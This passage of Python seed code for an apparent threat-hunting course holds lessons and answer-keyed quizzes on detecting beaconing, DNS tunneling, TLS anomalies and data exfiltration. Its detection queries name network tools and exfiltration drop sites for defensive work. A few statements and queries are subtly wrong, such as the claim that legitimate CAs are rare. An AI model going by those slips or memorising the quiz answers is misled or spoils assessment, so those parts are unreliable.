- **JA3 / JA3S** — TLS Client / Server Hello fingerprints. Rare values per fleet are hunt anchors.

## Further reading

- ATT&CK technique pages T1071, T1573, T1090, T1568, T1102, T1572, T1219.
- Salesforce JA3 / JA3S whitepaper.
- Zeek / Filebeat module reference for `connection-*`, `dns-*`, `ssl-*`.
""",
    )
    m5l2q = _add_lesson(
        session, mod5, order=4, title="Command and Control — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on beacon shape axes, T1102 SaaS dead-drops, the C2 domain-class tells, and JA3 fingerprinting.",
    )
    _add_q(session, m5l2q, order=1, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *correct* axes of **beacon shape** that the L2 looks for in a C2 hunt?",
        options=[
            {"value": "periodicity", "label": "Periodicity — tight inter-arrival interval with low jitter (e.g. every 60s ± 10s)"},
            {"value": "size_sym", "label": "Size symmetry — small clustered outbound bytes (heartbeat) + small inbound with occasional larger (tasking)"},
            {"value": "off_hours", "label": "Working-hours-agnostic — beacons fire at 03:00 UTC same as 14:00 UTC; user traffic doesn't"},
            {"value": "sparse_hosts", "label": "Sparse hostname diversity — one host hits one rare domain hundreds of times/day with no other domains touched"},
            {"value": "browser_ua", "label": "Beacons always use the legitimate corporate browser User-Agent"},
        ],
        correct=["periodicity", "size_sym", "off_hours", "sparse_hosts"],
        explanation_md="The four axes are periodicity, size symmetry, working-hours-agnostic, and sparse hostname diversity. The fifth option is wrong — beacons frequently use *unusual* User-Agents (`python-requests/2.x`, `curl/7.81`, missing UA) that the L2 hunts for separately (Lesson 5.3 HTTP hunts).",
        points=3,
    )
    _add_q(session, m5l2q, order=2, kind=QuestionKind.SINGLE,
        stem_md="An L2 sees outbound HTTPS from a server-class host to `https://example-org.workers.dev/`, `https://discord.com/api/webhooks/...`, and `https://raw.githubusercontent.com/.../...` at near-regular intervals. None of these are blocklisted. Which ATT&CK technique best fits?",
        options=[
            {"value": "t1071_004", "label": "T1071.004 DNS"},
            {"value": "t1102", "label": "T1102 Web Service — adversary using legitimate, allow-listed SaaS (Cloudflare Workers, Discord webhooks, GitHub raw) as C2 dead-drops"},
            {"value": "t1568_002", "label": "T1568.002 Dynamic Resolution: DGA"},
            {"value": "t1090_004", "label": "T1090.004 Domain Fronting"},
        ],
        correct="t1102",
        explanation_md="T1102 *Web Service* covers SaaS dead-drops — adversaries use legitimate cloud services (Cloudflare Workers, Discord webhook URLs, GitHub raw, Telegram Bot API, Pastebin, Slack hooks, Notion) as C2 endpoints because they're allow-listed for everyone. Detection is genuinely hard; the hunt becomes signal when paired with *unusual user* (non-developer hitting raw GitHub) or *unusual host* (server-class system reaching out to Discord).",
        points=2,
    )
    _add_q(session, m5l2q, order=3, kind=QuestionKind.SHORTANSWER,
        stem_md="Name the **TLS fingerprint** standard (commonly used for hunting rare TLS implementations across a fleet) that hashes the **TLS Client Hello** fields and produces a deterministic short value the L2 can pivot on. (Three or four characters.)",
        options=None,
        correct=["JA3", "ja3", "tls.client.ja3"],
        explanation_md="**JA3** — Salesforce-published TLS Client Hello hash; **JA3S** is the Server Hello equivalent. The L2 hunts for *rare* JA3 / JA3S values on the fleet (`COUNT_DISTINCT(host.name) ≤ 3` per JA3) — outliers often indicate malware-class TLS implementations or out-of-policy tools. **JA4** is the modern successor (more robust to TLS-extension reordering); the L2 should know it exists but JA3 is the workhorse in mid-2026 deployments.",
        points=2,
    )
    _add_q(session, m5l2q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="DGA-detected domains tend to have a **higher consonant-to-letter ratio and longer label length** than human-pronounceable English-bigram-distributed domains, which is why a simple `LENGTH > 14 AND consonant_ratio > 0.7` ES|QL filter catches a useful fraction of DGA traffic without ML.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** Most DGA implementations use random byte sequences mapped to base32-ish character sets, producing strings statistically far from natural language — high consonant ratio, low vowel cadence, frequent triple-consonant runs. A simple length+consonant-ratio filter is a useful first-pass; production-grade detection adds n-gram language models (random-forest classifiers on bigram / trigram features) for higher precision.",
        points=2,
    )

    # Lesson 5.3 — DNS + TLS hunts
    m5l3 = _add_lesson(
        session, mod5, order=5,
        title="DNS hunts and TLS hunts",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Hunt **DNS tunneling** — long subdomains, TXT-record volume, NXDOMAIN bursts, DoH detection, rare TLDs
> 2. Recognise **DNS exfiltration** shape (T1048.003 + T1572) vs DNS C2 vs benign DNS-as-service
> 3. Hunt **TLS anomalies** — rare JA3 / JA3S, self-signed, untrusted-root issuers, short-validity, CN-vs-SNI mismatch, TLS 1.0/1.1 downgrade
> 4. Hunt **HTTP** — User-Agent anomalies, unusual methods (PROPFIND, MKCOL), suspicious-path discovery (`/.git/config`, `/.env`)
> 5. Apply queries against `logs-zeek.dns-*`, `logs-zeek.ssl-*`, `logs-zeek.http-*`, `logs-suricata.eve-*`

## DNS hunts

### Long-subdomain detection

DNS-tunnel traffic encodes payload bytes as subdomain labels. A label can be up to 63 characters; total domain length up to 253. Legitimate DNS rarely exceeds 50 characters total.

```esql
FROM logs-zeek.dns-*
| WHERE @timestamp > NOW() - 24h
| EVAL question_len = LENGTH(dns.question.name)
| WHERE question_len > 80
| STATS query_count = COUNT(),
        avg_len = AVG(question_len),
        max_len = MAX(question_len)
  BY host.name, dns.question.registered_domain, BUCKET(@timestamp, 1h)
| WHERE query_count > 50
| SORT query_count DESC
| LIMIT 100
```

`question_len > 80` is the catch-all; production deployments tune by environment.

### TXT-record query volume

DNS tunneling tools often use TXT records as the response carrier (more bytes per response than A or AAAA).

```esql
FROM logs-zeek.dns-*
| WHERE @timestamp > NOW() - 1h
  AND dns.question.type == "TXT"
| STATS txt_count = COUNT(),
        unique_zones = COUNT_DISTINCT(dns.question.registered_domain)
  BY host.name, BUCKET(@timestamp, 5m)
| WHERE txt_count > 20
| SORT txt_count DESC
```

Most hosts produce 0–1 TXT queries per hour from `_dmarc` / `_acme-challenge` / SPF lookups. > 20 TXT queries in 5 minutes from one host is a strong tunnel signal.

### NXDOMAIN bursts

Encoded-payload DNS queries often produce NXDOMAIN responses (the encoded subdomain doesn't exist). A cluster of NXDOMAINs to one parent zone followed by a successful A-record lookup is the textbook tunnel handshake.

```kql
event.dataset: "zeek.dns"
  and dns.response_code: "NXDOMAIN"
```

```esql
FROM logs-zeek.dns-*
| WHERE @timestamp > NOW() - 1h
  AND dns.response_code == "NXDOMAIN"
| STATS nx_count = COUNT()
  BY host.name, dns.question.registered_domain, BUCKET(@timestamp, 5m)
| WHERE nx_count > 30
| SORT nx_count DESC
```

### DNS over HTTPS (DoH) detection

DoH bypasses the corporate DNS resolver, allowing a host to do DNS resolution against an external HTTPS endpoint (Cloudflare 1.1.1.1 / Quad9 / Google 8.8.8.8 over HTTPS, or attacker-controlled DoH). Detection: outbound TCP/443 to known DoH endpoints from a host that should resolve via internal DNS.

```kql
event.dataset: ("zeek.connection" or "logs-endpoint.events.network")
  and destination.port: 443
  and (destination.ip: "1.1.1.1" or destination.ip: "1.0.0.1"
       or destination.ip: "8.8.8.8" or destination.ip: "8.8.4.4"
       or destination.ip: "9.9.9.9"
       or destination.domain: ("dns.google" or "cloudflare-dns.com" or "dns.quad9.net"))
  and not user.name: ("admin_*" or "svc_dns_*")
```

### Rare TLD detection

Bulletproof / abuse-prone TLDs (`.top` / `.xyz` / `.icu` / `.click` / `.cn` / `.ru` / `.tk`) carry disproportionately high abuse rates. Filtering DNS for queries to these TLDs from non-development hosts is a useful filter:

```esql
FROM logs-zeek.dns-*
| WHERE @timestamp > NOW() - 24h
  AND dns.question.top_level_domain IN ("top", "xyz", "icu", "click", "tk", "cn", "ru")
| STATS query_count = COUNT()
  BY host.name, dns.question.registered_domain
| SORT query_count DESC
| LIMIT 100
```

## TLS hunts

### Rare JA3 / JA3S

Most fleets produce a small set of JA3 values — Chrome, Edge, Firefox, the OS-native HTTPS client, a few SDK clients. An outlier JA3 visible on ≤ 3 hosts is hunt-worthy.

```esql
FROM logs-zeek.ssl-*
| WHERE @timestamp > NOW() - 7d
| STATS host_count = COUNT_DISTINCT(host.name),
        conn_count = COUNT(),
        sni_examples = VALUES(tls.client.server_name)
  BY tls.client.ja3
| WHERE host_count <= 3 AND conn_count >= 5
| SORT conn_count DESC
| LIMIT 50
```

JA4 is the successor — more robust to TLS-extension reordering — and increasingly available in Zeek / Suricata. The L2 should know JA4 exists; JA3 remains the workhorse in 2026.

### Self-signed certificate detection

Self-signed certs presented on outbound TLS to unknown CAs are a strong C2 signal. Legitimate CAs are rare on the public Internet.

```kql
event.dataset: "zeek.ssl"
  and tls.server.x509.subject.common_name: *
  and tls.server.x509.issuer.common_name: tls.server.x509.subject.common_name
```

(KQL doesn't compare two fields directly — this is conceptual; ES|QL has the comparison via `EVAL`.)

```esql
FROM logs-zeek.ssl-*
| WHERE @timestamp > NOW() - 24h
  AND tls.server.x509.subject.common_name == tls.server.x509.issuer.common_name
| KEEP @timestamp, host.name, destination.ip,
       tls.server.x509.subject.common_name, tls.server.x509.issuer.common_name
| LIMIT 200
```

### Untrusted-root issuers

Certificates from non-public CAs (no Let's Encrypt / DigiCert / GlobalSign / Sectigo / Microsoft) on outbound HTTPS:

```kql
event.dataset: "zeek.ssl"
  and not tls.server.x509.issuer.common_name: ("Let's Encrypt*"
                                                or "DigiCert*"
                                                or "GlobalSign*"
                                                or "Sectigo*"
                                                or "Microsoft*"
                                                or "Amazon*"
                                                or "Google*"
                                                or "Cloudflare*")
```

### Short-validity certificates

Let's Encrypt issues 90-day certs; many ephemeral C2 setups use very-short-validity certs (≤ 30 days). Detection:

```esql
FROM logs-zeek.ssl-*
| WHERE @timestamp > NOW() - 7d
  AND tls.server.x509.not_before IS NOT NULL
  AND tls.server.x509.not_after IS NOT NULL
| EVAL validity_days = DATE_DIFF("day", tls.server.x509.not_before, tls.server.x509.not_after)
| WHERE validity_days < 30
| STATS conn_count = COUNT() BY destination.ip, validity_days
| SORT conn_count DESC
```

### CN-vs-SNI mismatch

A cert whose subject CN doesn't match the SNI the client sent is a domain-fronting tell or a misconfigured server. Hunt:

```esql
FROM logs-zeek.ssl-*
| WHERE @timestamp > NOW() - 24h
  AND tls.client.server_name IS NOT NULL
  AND tls.server.x509.subject.common_name IS NOT NULL
  AND NOT tls.server.x509.subject.common_name == tls.client.server_name
  AND NOT tls.server.x509.subject.common_name LIKE CONCAT("*.", tls.client.server_name)
| KEEP @timestamp, host.name, destination.ip,
       tls.client.server_name, tls.server.x509.subject.common_name
| LIMIT 100
```

### TLS 1.0 / 1.1 downgrade

Modern clients negotiate TLS 1.2 / 1.3. TLS 1.0 / 1.1 on outbound 2026 traffic indicates either a legacy device or malicious tooling that pinned an old protocol.

```kql
event.dataset: "zeek.ssl"
  and tls.version: ("TLS 1.0" or "TLS 1.1" or "TLSv1.0" or "TLSv1.1")
```

## HTTP hunts

### User-Agent anomalies

Default UAs from common scripting frameworks are strong tunnel signals:

```kql
event.dataset: ("zeek.http" or "logs-suricata.eve")
  and (http.request.headers.user-agent: *python-requests*
       or http.request.headers.user-agent: *curl/*
       or http.request.headers.user-agent: *Wget/*
       or http.request.headers.user-agent: *PowerShell*
       or http.request.headers.user-agent: *Go-http-client*
       or not http.request.headers.user-agent: *)
```

The `not ua: *` clause catches missing-UA requests (some malware emits no UA at all).

### Unusual HTTP methods

`PROPFIND`, `MKCOL`, `LOCK`, `UNLOCK`, `COPY`, `MOVE` are WebDAV. They have legitimate uses (SharePoint, file servers) but appearing in outbound traffic from a workstation is a tunnel signal:

```kql
event.dataset: "zeek.http"
  and http.request.method: ("PROPFIND" or "MKCOL" or "LOCK" or "COPY" or "MOVE")
```

### Suspicious-path discovery

Recon hunts for the `.git/config` / `.env` / `phpinfo.php` / `wp-admin` cluster from one source:

```esql
FROM logs-zeek.http-*
| WHERE @timestamp > NOW() - 1h
  AND url.path LIKE "%.git/config%"
   OR url.path LIKE "%.env%"
   OR url.path LIKE "%phpinfo.php%"
   OR url.path LIKE "%/wp-admin/%"
   OR url.path LIKE "%/admin/login%"
| STATS path_count = COUNT_DISTINCT(url.path),
        request_count = COUNT()
  BY source.ip, BUCKET(@timestamp, 10m)
| WHERE path_count >= 4
| SORT request_count DESC
```

A source IP hitting four or more reconnaissance paths in 10 minutes is a discovery / scanning signal.

## Glossary

- **DNS tunneling fingerprints** — long subdomain labels (>50 char), TXT-record volume burst, NXDOMAIN clusters preceding A-record success, low-TTL responses.
- **JA3 / JA3S / JA4** — TLS Client / Server Hello fingerprints; JA4 succeeds JA3 with extension-order robustness.
- **CN-vs-SNI mismatch** — cert subject doesn't match client-supplied SNI; domain-fronting or misconfig signal.
- **WebDAV methods** (`PROPFIND` / `MKCOL` etc.) — protocol verbs that frequently surface in tunneling tools.

## Further reading

- Zeek `dns-*` and `ssl-*` log references.
- Suricata EVE `dns` and `tls` event-type docs.
- JA3 / JA4 Salesforce + FoxIO references.
""",
    )
    m5l3q = _add_lesson(
        session, mod5, order=6, title="DNS & TLS hunts — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on DNS-tunneling fingerprints, JA3 fleet-rarity, self-signed-cert detection, and WebDAV HTTP-method anomalies.",
    )
    _add_q(session, m5l3q, order=1, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *strong* DNS-tunneling fingerprints an L2 should hunt for in `logs-zeek.dns-*`?",
        options=[
            {"value": "long_sub", "label": "Question name length > 80 characters total"},
            {"value": "txt_burst", "label": "High TXT-record query volume from one host (> 20 TXT queries in 5 minutes)"},
            {"value": "nx_burst", "label": "NXDOMAIN burst followed by an A-record success on the same parent zone"},
            {"value": "doh", "label": "Outbound TCP/443 to a known DoH endpoint (1.1.1.1, dns.google, cloudflare-dns.com) from a non-admin host"},
            {"value": "single_q", "label": "A single A-record query for `google.com`"},
        ],
        correct=["long_sub", "txt_burst", "nx_burst", "doh"],
        explanation_md="Long subdomains, TXT-record bursts, NXDOMAIN clusters, and DoH-bypass are all canonical tunnel/exfil signals. A single A-record for `google.com` is normal traffic — the trap is the fifth option.",
        points=3,
    )
    _add_q(session, m5l3q, order=2, kind=QuestionKind.SINGLE,
        stem_md="An L2 wants to surface **rare TLS Client Hello fingerprints** across the fleet — outlier JA3 values that appear on ≤ 3 hosts, suggesting non-standard TLS implementations like malware or out-of-policy tools. Which ES|QL pattern is correct?",
        options=[
            {"value": "wrong_field", "label": "`STATS conn_count = COUNT() BY tls.cipher`"},
            {"value": "right", "label": "`STATS host_count = COUNT_DISTINCT(host.name), conn_count = COUNT() BY tls.client.ja3 | WHERE host_count <= 3 AND conn_count >= 5`"},
            {"value": "all_hosts", "label": "`STATS COUNT() BY host.name`"},
            {"value": "by_ip", "label": "`STATS COUNT() BY destination.ip`"},
        ],
        correct="right",
        explanation_md="Aggregate by `tls.client.ja3` and count distinct hosts that produced each fingerprint. Filter to JA3 values seen on ≤ 3 hosts with ≥ 5 connections — the rare-implementation outlier set. JA3S is the server-side equivalent (`tls.server.ja3s`); JA4 is the modern successor with extension-order robustness.",
        points=2,
    )
    _add_q(session, m5l3q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An L2 sees outbound TLS where the certificate's `tls.server.x509.subject.common_name` is *equal to* `tls.server.x509.issuer.common_name`. What does this fingerprint?",
        options=[
            {"value": "expired", "label": "Expired certificate"},
            {"value": "self_signed", "label": "**Self-signed** certificate — subject and issuer are the same entity. On outbound HTTPS this is a strong C2 signal because legitimate public-CA-issued certs have a different issuer (Let's Encrypt / DigiCert / etc.)"},
            {"value": "wildcard", "label": "Wildcard certificate covering all subdomains"},
            {"value": "ev", "label": "Extended-Validation certificate"},
        ],
        correct="self_signed",
        explanation_md="Subject == Issuer is the textbook self-signed signature. Legitimate public-CA certs have a third-party issuer (`Let's Encrypt Authority X3`, `DigiCert Global G2`, etc.). Self-signed certs on outbound HTTPS are rare in legitimate traffic and a strong C2 signal — paired with rare JA3, short-validity, or CN-vs-SNI-mismatch they form a high-confidence detection.",
        points=2,
    )
    _add_q(session, m5l3q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="HTTP requests using `PROPFIND`, `MKCOL`, `LOCK`, `COPY`, `MOVE` methods originating from workstations to outbound destinations are a strong **WebDAV / tunneling** signal that the L2 should investigate, despite these methods having legitimate uses with SharePoint and file servers internally.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** WebDAV verbs are legitimately used internally (SharePoint, network shares) but their appearance in *outbound* traffic from a workstation to an external destination is a strong tunneling-tool signal — common in tools that establish file-share-style channels for exfil. The internal-vs-outbound distinction is the L2's filter; raw method-name filtering produces high noise without it.",
        points=2,
    )

    # Lesson 5.4 — Exfiltration + statistical hunts + capstone
    m5l4 = _add_lesson(
        session, mod5, order=7,
        title="Exfiltration (TA0010), statistical-anomaly hunts, and a worked end-to-end capstone",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Hunt **T1041 Exfiltration Over C2** via byte-volume asymmetry and **T1567 Exfiltration Over Web Service** with the cloud-storage drop-off list
> 2. Catch **T1048 Exfiltration Over Alternative Protocol** (DNS, ICMP, raw FTP / SMB) and **T1029 Scheduled Transfer**
> 3. Apply the four canonical **statistical-anomaly hunts** in ES|QL — beacon-shape, rare-destination, byte-volume outlier, UA / JA3 rarity
> 4. Walk the **worked PEAK capstone** for a beaconing-anomaly hunt end to end with both an **ES|QL** and an **EQL** Kibana Security detection-rule body

## T1041 Exfiltration Over C2 Channel

Exfil rides the same pathway as inbound C2 commands. Detection via **byte-volume asymmetry**: outbound bytes >> inbound for a sustained window:

```esql
FROM logs-zeek.connection-*
| WHERE @timestamp > NOW() - 24h
  AND zeek.connection.state == "SF"
  AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS bytes_out = SUM(source.bytes),
        bytes_in = SUM(destination.bytes),
        conn_count = COUNT()
  BY host.name, destination.ip, BUCKET(@timestamp, 1h)
| EVAL ratio = TO_DOUBLE(bytes_out) / TO_DOUBLE(bytes_in + 1)
| WHERE bytes_out > 10000000  // >10 MB outbound
  AND ratio > 5.0              // outbound / inbound > 5x
| SORT bytes_out DESC
| LIMIT 100
```

10 MB outbound with a 5:1 ratio in a 1-hour bucket is suspicious; tune per environment.

## T1567 Exfiltration Over Web Service

### .002 Cloud Storage drop-offs

Adversaries use legitimate file-share services as exfil endpoints. The L2's hunt list:

```kql
event.dataset: ("zeek.dns" or "zeek.connection" or "logs-endpoint.events.network")
  and destination.domain: ("*.mega.nz" or "*.dropbox.com" or "*.onedrive.live.com"
                           or "*.googledrive.com" or "*.drive.google.com"
                           or "*.discordapp.com" or "*.discord.com"
                           or "*.transfer.sh" or "*.anonfiles.com"
                           or "*.file.io" or "*.gofile.io"
                           or "*.bashupload.com" or "*.0x0.st"
                           or "*.catbox.moe" or "*.pixeldrain.com")
  and not user.name: ("dev_*")
```

### .003 Code Repository

GitHub / GitLab as exfil — adversary creates a private repo and pushes stolen data via git operations:

```kql
event.dataset: "zeek.connection"
  and destination.domain: ("github.com" or "gitlab.com" or "bitbucket.org")
  and destination.port: 22  // SSH-keyed git push
```

## T1048 Exfiltration Over Alternative Protocol

- **.003 Unencrypted Non-C2** — raw FTP, SMB-over-WAN. Rare in modern environments because most enterprise blocks both at the edge.
- **.001 Symmetric Encrypted Non-C2** — DNS tunneling (Lesson 5.3), ICMP tunneling.

DNS exfil hunt — large total bytes carried as subdomains:

```esql
FROM logs-zeek.dns-*
| WHERE @timestamp > NOW() - 1h
| EVAL question_len = LENGTH(dns.question.name)
| STATS total_bytes = SUM(question_len),
        query_count = COUNT()
  BY host.name, dns.question.registered_domain, BUCKET(@timestamp, 5m)
| WHERE total_bytes > 51200  // >50 KB cumulative subdomain bytes per 5min
| SORT total_bytes DESC
```

50 KB/hour of subdomain-encoded data is far above any legitimate DNS pattern.

## T1029 Scheduled Transfer

Low-and-slow exfil during off-hours. Detection: outbound traffic clusters in the 02:00–05:00 local-time window from hosts that are otherwise quiet overnight.

```esql
FROM logs-zeek.connection-*
| WHERE @timestamp > NOW() - 7d
| EVAL hour = DATE_EXTRACT("HOUR_OF_DAY", @timestamp)
| WHERE hour >= 2 AND hour < 5
| STATS bytes_out = SUM(source.bytes),
        conn_count = COUNT()
  BY host.name, destination.ip
| WHERE bytes_out > 100000000  // >100 MB outbound during 02:00-05:00 window
| SORT bytes_out DESC
```

## The four statistical-anomaly hunt patterns in ES|QL

### 1. Beacon-shape

Multi-axis beacon detection (combining periodicity proxy, single-destination, hours-active):

```esql
FROM logs-zeek.connection-*
| WHERE @timestamp > NOW() - 7d
  AND zeek.connection.state == "SF"
  AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS conn_count = COUNT(),
        unique_dest = COUNT_DISTINCT(destination.ip),
        active_hours = COUNT_DISTINCT(BUCKET(@timestamp, 1h)),
        avg_bytes_out = AVG(source.bytes)
  BY host.name, destination.ip
| WHERE conn_count > 100
  AND unique_dest == 1
  AND active_hours > 12
| SORT conn_count DESC
| LIMIT 100
```

### 2. Rare-destination by host

Hosts that visit an unusual destination relative to their own baseline. Requires a baseline subquery — for simplicity, here using fleet-rarity:

```esql
FROM logs-zeek.connection-*
| WHERE @timestamp > NOW() - 30d
  AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS host_count = COUNT_DISTINCT(host.name),
        conn_count = COUNT()
  BY destination.ip
| WHERE host_count <= 2 AND conn_count >= 30
| SORT conn_count DESC
| LIMIT 200
```

### 3. Byte-volume outlier

Hosts whose outbound byte volume spikes anomalously:

```esql
FROM logs-zeek.connection-*
| WHERE @timestamp > NOW() - 7d
| STATS bytes_out = SUM(source.bytes)
  BY host.name, BUCKET(@timestamp, 1d)
| WHERE bytes_out > 1000000000  // >1 GB outbound in a day
| SORT bytes_out DESC
```

### 4. UA / JA3 rarity

Covered in Lesson 5.3.

## The PEAK capstone — beaconing-anomaly hunt

A complete L2-grade hunt walked end-to-end.

### Prepare

**Hypothesis (four-element).** *In the past 7 days, an adversary has used T1071.001 + T1573.002 web/TLS C2 with low-jitter periodicity to a single destination IP from at least one host, observable in `logs-zeek.connection-*` joined with `logs-endpoint.events.network-*` and `logs-endpoint.events.process-*` to attribute the beacon to a specific process.*

- **ATT&CK:** T1071.001 + T1573.002 + (likely) T1568.002 if NRD/DGA-shaped + (possibly) T1102 if SaaS dead-drop.
- **Data sources:** `logs-zeek.connection-*` (network-side), `logs-endpoint.events.network-*` (host-side with `process.entity_id`), `logs-endpoint.events.process-*` (process attribution).
- **Window:** explicit UTC bounds.

### Execute

**Q1 — Broad ES|QL** (per-host per-destination per-hour aggregation):

```esql
FROM logs-zeek.connection-*
| WHERE @timestamp > NOW() - 7d
  AND zeek.connection.state == "SF"
  AND network.transport == "tcp"
  AND destination.port IN (443, 80, 8080, 8443)
  AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS conn_count = COUNT(),
        unique_dest = COUNT_DISTINCT(destination.ip),
        active_hours = COUNT_DISTINCT(BUCKET(@timestamp, 1h)),
        avg_bytes_out = AVG(source.bytes)
  BY host.name, destination.ip
```

**Q2 — Narrow** (apply beacon-shape filter):

```esql
| WHERE conn_count > 100
  AND unique_dest == 1
  AND active_hours > 12
| SORT conn_count DESC
| LIMIT 100
```

**Q3 — Enrichment** (DNS resolution + JA3S):

```esql
FROM logs-zeek.connection-*, logs-zeek.dns-*, logs-zeek.ssl-*
| WHERE @timestamp > NOW() - 7d
  AND host.name == "<survivor host>"
  AND destination.ip == "<survivor ip>"
| STATS dns_names = VALUES(dns.question.name),
        ja3s = VALUES(tls.server.ja3s),
        conn_count = COUNT()
  BY host.name, destination.ip
```

**Q4 — Process attribution** (EQL `sequence` on the host side):

```eql
sequence by host.name, process.entity_id with maxspan=5m
  [ process where event.action : ("start", "process_started")
              and not process.code_signature.trusted == true ]
  [ network where destination.ip == "<survivor ip>"
              and destination.port in (443, 80) ]
```

### Act

Disposition the survivor list. A high-confidence TP — process attribution to an unsigned binary spawning regular-interval HTTPS to a single rare destination with sparse hostname diversity — is *page-IR*. Hand off to IR with the hunt report attached.

### Know

Update Navigator coverage red → orange (hunting coverage) and propose two detection-rule bodies:

**ES|QL detection-rule body** (threshold-based aggregation):

```esql
FROM logs-zeek.connection-*
| WHERE @timestamp > NOW() - 1h
  AND zeek.connection.state == "SF"
  AND network.transport == "tcp"
  AND destination.port IN (443, 80, 8080, 8443)
  AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS conn_count = COUNT(),
        unique_dest = COUNT_DISTINCT(destination.ip)
  BY host.name, destination.ip
| WHERE conn_count > 50 AND unique_dest == 1
```

**EQL detection-rule body** (process-spawn → network-connect chain):

```eql
sequence by host.name with maxspan=2m
  [ process where event.action : ("start", "process_started")
              and not process.code_signature.trusted == true
              and not process.executable : ("?:\\\\Program Files\\\\*",
                                             "?:\\\\Windows\\\\System32\\\\*") ]
  [ network where destination.port in (443, 80, 8080, 8443)
              and not cidrMatch(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16") ]
```

Both bodies submit to TIDE with severity *high*, threat metadata `T1071.001` + `T1573.002`, and the hunt report attached. After 90 days of FP-rate measurement, Navigator transitions yellow → green.

## Glossary

- **Byte-volume asymmetry** — outbound bytes >> inbound for sustained window; T1041 fingerprint.
- **Cloud-storage drop-off list** — `mega.nz`, `dropbox.com`, `transfer.sh`, `anonfiles.com`, `file.io`, `gofile.io`, `bashupload.com`, `0x0.st`, `catbox.moe`, `pixeldrain.com`, plus Discord CDN.
- **Scheduled transfer (T1029)** — exfil clusters in the 02:00–05:00 local-time window.
- **Four statistical-anomaly hunt patterns** — beacon-shape / rare-destination / byte-volume outlier / UA-JA3 rarity.

## Further reading

- ATT&CK technique pages T1041, T1567, T1048, T1029.
- Elastic Security prebuilt rules — Exfiltration EQL/ES|QL rules.
- Zeek / Suricata Filebeat module references for production deployments.
""",
    )
    m5l4q = _add_lesson(
        session, mod5, order=8, title="Exfil & capstone — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on byte-volume asymmetry, T1567.002 SaaS exfil hunting, scheduled-transfer hour filtering, and the capstone EQL process-attribution chain.",
    )
    _add_q(session, m5l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 wants to detect **T1041 Exfiltration Over C2 Channel** by spotting hosts whose outbound byte-volume vastly exceeds inbound for sustained periods. Which ES|QL pattern is correct?",
        options=[
            {"value": "any_bytes", "label": "`STATS COUNT() BY host.name`"},
            {"value": "ratio", "label": "`STATS bytes_out = SUM(source.bytes), bytes_in = SUM(destination.bytes) BY host.name, destination.ip, BUCKET(@timestamp, 1h) | EVAL ratio = TO_DOUBLE(bytes_out) / TO_DOUBLE(bytes_in + 1) | WHERE bytes_out > 10000000 AND ratio > 5.0`"},
            {"value": "name_only", "label": "Filter by destination.domain matching cloud-storage names"},
            {"value": "asymm", "label": "Filter by outbound bytes only with no comparison to inbound"},
        ],
        correct="ratio",
        explanation_md="Byte-volume asymmetry is computed per (host × destination × time-bucket) by summing source.bytes and destination.bytes, computing the outbound/inbound ratio in `EVAL`, and filtering. The `+1` prevents division by zero. 10 MB outbound + 5:1 ratio in a 1-hour bucket is the textbook T1041 signal; tune per environment baseline.",
        points=2,
    )
    _add_q(session, m5l4q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following destination domains should an L2's **T1567.002 cloud-storage exfiltration** hunt include in its filter?",
        options=[
            {"value": "mega", "label": "`*.mega.nz`"},
            {"value": "anonfiles", "label": "`*.anonfiles.com`"},
            {"value": "transfer", "label": "`*.transfer.sh`"},
            {"value": "discord", "label": "`*.discordapp.com` / `*.discord.com` (Discord CDN)"},
            {"value": "msft", "label": "`*.microsoft.com`"},
        ],
        correct=["mega", "anonfiles", "transfer", "discord"],
        explanation_md="Mega, AnonFiles, transfer.sh, and Discord CDN are all canonical T1567.002 drop-off destinations. The full L2 hunt list also includes file.io, gofile.io, bashupload, 0x0.st, catbox.moe, pixeldrain — and the major personal-cloud surfaces (Dropbox, Google Drive, OneDrive). `*.microsoft.com` is far too broad — it would catch every Office 365 connection in the estate. Hunts target *small / specific* SaaS services, not entire vendor namespaces.",
        points=3,
    )
    _add_q(session, m5l4q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An L2 hunts for **T1029 Scheduled Transfer** — adversaries that exfil during off-hours to avoid detection. Which ES|QL clause filters to the canonical 02:00–05:00 local-time window?",
        options=[
            {"value": "where_two", "label": "`WHERE hour == 2`"},
            {"value": "extract", "label": "`EVAL hour = DATE_EXTRACT(\"HOUR_OF_DAY\", @timestamp) | WHERE hour >= 2 AND hour < 5`"},
            {"value": "between", "label": "`WHERE @timestamp BETWEEN 02:00 AND 05:00`"},
            {"value": "string", "label": "`WHERE @timestamp LIKE \"%T02:%\"`"},
        ],
        correct="extract",
        explanation_md="`DATE_EXTRACT(\"HOUR_OF_DAY\", @timestamp)` produces the hour-of-day integer (0–23) in `EVAL`; the subsequent `WHERE hour >= 2 AND hour < 5` filters to the 02:00–05:00 window. Note the time-zone semantics depend on cluster configuration — for multi-timezone fleets the L2 should baseline per-host-or-per-region rather than fleet-wide.",
        points=2,
    )
    _add_q(session, m5l4q, order=4, kind=QuestionKind.TRUEFALSE,
